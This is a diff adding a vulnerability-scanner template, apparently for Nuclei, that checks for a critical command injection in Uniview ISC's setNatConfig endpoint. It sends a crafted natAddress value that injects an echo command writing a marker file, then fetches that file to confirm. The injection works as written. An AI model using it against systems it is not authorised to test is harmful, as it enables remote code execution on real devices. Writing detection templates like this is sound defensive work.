@@ -1,0 +1,45 @@
+id: poc-yaml-uniview-isc-setnatconfig-command-injection
+info:
+  name: "浙江宇视 ISC setNatConfig 命令注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: Uniview
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/Interface/DevManage/VM.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "cmd=setNatConfig&natAddress=%26echo%20{{t2}}%20>{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":false"
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/Interface/DevManage/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
